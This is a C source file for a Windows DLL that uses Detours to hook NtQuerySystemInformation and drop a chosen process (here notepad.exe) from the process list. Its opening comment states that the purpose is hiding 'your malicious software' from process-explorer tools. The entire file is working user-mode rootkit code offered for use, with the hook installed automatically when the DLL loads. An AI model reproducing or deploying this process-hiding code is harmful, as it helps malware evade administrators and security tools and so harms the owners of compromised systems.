// example of using API hooks to block certain processes from accessing information about other processes 
// this can be used to stop process/file explorer application from viewing your malicious software 

#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <winternl.h>
#include "detours.h"
#include "nt.h"

#pragma comment(lib, "shlwapi.lib")

NtQuerySystemInformation_t pNtQuerySystemInformation = NULL;

//returns the systeminformation structure with the nextentry offset changed 
NTSTATUS NTAPI HookedQuerySystemInformation( SYSTEM_INFORMATION_CLASS SystemInformationClass,
PVOID SystemInformation, ULONG SystemInformationLength,	PULONG ReturnLength){
		
	NTSTATUS status = pNtQuerySystemInformation( SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
		
	if (SystemInformationClass == SystemProcessInformation) {
		wchar_t hidden_proc[] = L"notepad.exe";
		DWORD totalSkip;
		SYSTEM_PROCESS_INFORMATION * OG = (SYSTEM_PROCESS_INFORMATION *) SystemInformation;
		SYSTEM_PROCESS_INFORMATION * curr = (SYSTEM_PROCESS_INFORMATION *)SystemInformation;  
		SYSTEM_PROCESS_INFORMATION * previous = (SYSTEM_PROCESS_INFORMATION *) SystemInformation;   
		while (curr->NextEntryOffset != 0){
			totalSkip = 0;
			while (StrStrIW(curr->ImageName.Buffer, hidden_proc)){
				totalSkip += curr->NextEntryOffset;	
				curr = (SYSTEM_PROCESS_INFORMATION *)((char *)curr + curr->NextEntryOffset);
			}
			previous->NextEntryOffset += totalSkip;
			previous = curr;
			curr = (SYSTEM_PROCESS_INFORMATION *)((char *)curr + curr->NextEntryOffset);
		}
	}
	
	return status;
	
}

int Hook() {
	
	//detours to hook ntquerysysinfo
    pNtQuerySystemInformation = (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

	DetourRestoreAfterWith();	
	DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourAttach(&(PVOID&)pNtQuerySystemInformation, HookedQuerySystemInformation);
    DetourTransactionCommit();
		
	return 0;
	
}

int unHook(){
	
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)pNtQuerySystemInformation, HookedQuerySystemInformation);
    DetourTransactionCommit();	

	return 0;

}	
	
	

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hook();
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			unHook();
			break;
	}
	
    return TRUE;
}
